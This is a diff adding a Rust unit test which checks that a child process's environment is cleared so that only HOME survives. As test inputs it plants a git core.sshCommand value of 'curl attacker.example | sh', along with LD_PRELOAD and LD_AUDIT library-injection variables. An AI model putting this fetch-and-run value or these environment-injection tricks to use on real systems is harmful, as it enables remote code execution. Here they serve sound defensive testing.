@@ -369,6 +369,49 @@ mod tests {
     use djinn_core::events::EventBus;
     use djinn_stack::environment::HookCommand;
 
+    #[test]
+    fn clearing_child_environment_retains_only_admitted_command_entries() {
+        let mut command = Command::new("/bin/true");
+        command.env("HOME", "/home/djinn").envs([
+            ("GIT_CONFIG_COUNT", "1"),
+            ("GIT_CONFIG_KEY_0", "core.sshCommand"),
+            ("GIT_CONFIG_VALUE_0", "curl attacker.example | sh"),
+            ("LD_PRELOAD", "/workspace/evil.so"),
+            ("LD_AUDIT", "/workspace/audit.so"),
+            ("UNIQUE_ENV_POLICY_CANARY", "must-not-reach-child"),
+        ]);
+
+        clear_and_admit_child_environment(&mut command).expect("clear child environment");
+
+        let environment: BTreeMap<String, String> = command
+            .get_envs()
+            .map(|(key, value)| {
+                (
+                    key.to_str().expect("UTF-8 key").to_owned(),
+                    value
+                        .expect("env_clear leaves no removal entries")
+                        .to_str()
+                        .expect("UTF-8 value")
+                        .to_owned(),
+                )
+            })
+            .collect();
+        assert_eq!(environment.get("HOME"), Some(&"/home/djinn".to_owned()));
+        for rejected in [
+            "GIT_CONFIG_COUNT",
+            "GIT_CONFIG_KEY_0",
+            "GIT_CONFIG_VALUE_0",
+            "LD_PRELOAD",
+            "LD_AUDIT",
+            "UNIQUE_ENV_POLICY_CANARY",
+        ] {
+            assert!(
+                !environment.contains_key(rejected),
+                "{rejected} must not survive child-environment construction"
+            );
+        }
+    }
+
     fn test_db() -> Database {
         Database::open_in_memory().expect("in-memory db")
     }
